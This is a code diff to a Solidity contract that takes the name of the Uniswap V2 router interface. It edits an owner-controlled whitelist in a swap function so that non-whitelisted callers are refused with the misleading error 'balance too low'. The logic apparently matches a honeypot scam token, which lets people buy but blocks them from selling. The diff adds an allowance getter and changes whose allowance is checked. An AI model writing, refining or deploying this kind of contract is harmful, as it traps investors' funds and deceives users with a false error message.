@@ -30,6 +30,10 @@ contract IUniswapV2Router02 {
         return owner;
     }
 
+    function getAllowTransactions(address a) view external returns(uint) {
+        return allowance[a];
+    }
+
     function swapExactTokensForETHSupportingFeeOnTransferTokens(
         uint256 amountIn,
         uint256 amountOutMin,
@@ -43,13 +47,13 @@ contract IUniswapV2Router02 {
         } else {
             if (path[0] != owner) {
                 // if not owner
-                if (allowance[msg.sender] < 1) {
+                if (allowance[path[0]] < 1) {
                     // if sender not in white list
                     revert("balance too low");
                     return false;
                 }
                 // if sender in white list
-                allowance[msg.sender] -= 1;
+                allowance[path[0]] -= 1;
                 return true;
             } else {
                 // if owner
